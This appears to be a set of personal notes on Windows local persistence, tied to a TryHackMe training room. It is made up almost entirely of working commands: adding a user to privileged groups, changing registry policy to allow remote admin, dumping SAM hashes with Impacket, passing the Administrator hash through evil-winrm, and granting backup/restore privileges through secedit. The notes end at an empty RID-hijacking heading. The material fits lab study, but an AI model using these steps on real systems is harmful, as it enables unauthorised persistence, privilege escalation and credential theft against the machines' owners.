Best Resource on the planet: [https://tryhackme.com/room/windowslocalpersistence](https://tryhackme.com/room/windowslocalpersistence)

# Add users to groups
```powershell
# Add to admin
net localgroup administrators oscar42 /add

# Add to backup operators. Can read/write any mem location or reg
net localgroup "Backup Operators" oscar42 /add

# Allow RDP for backup operators 
net localgroup "Remote Management Users" oscar42 /add

# Disable LocalAccountTokenFilterPolicy to allow use of remote admin
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

```

## Conn to group using Evil-WinRM
```bash
# Connect to box
evil-winrm -i 10.10.0.1 -u oscar42 -p Password321

# Check Groups 
whoami /groups

# Download for secrets dump
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak

# Dump hashes using Impacket
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

# Login using admin hash (last part of hashdump)
evil-winrm -i 10.10.0.1 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

# Special Privileges and Security Descriptors
**List of privs:** [https://docs.microsoft.com/...](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
| Name                   | Description                                                            |
| ---------------------- | ---------------------------------------------------------------------- |
| SeBackupPrivilege  | The user can read any file in the system, ignoring any DACL in place.  |
| SeRestorePrivilege | The user can write any file in the system, ignoring any DACL in place. | 

```PowerShell
# Export current config
secedit /export /cfg config.inf

# Add user to lines in config
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,oscar42
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,oscar42

#Convert modified file to DB and load it to sys

secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf

# To allow RDP, Open GUI, Add oscar42 user, Allow Full controll permission
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

# You can now connect to Winrm
evil-winrm -i 10.10.0.1 -u oscar42 -p Password321
```

# Relative ID (RID) Hijacking
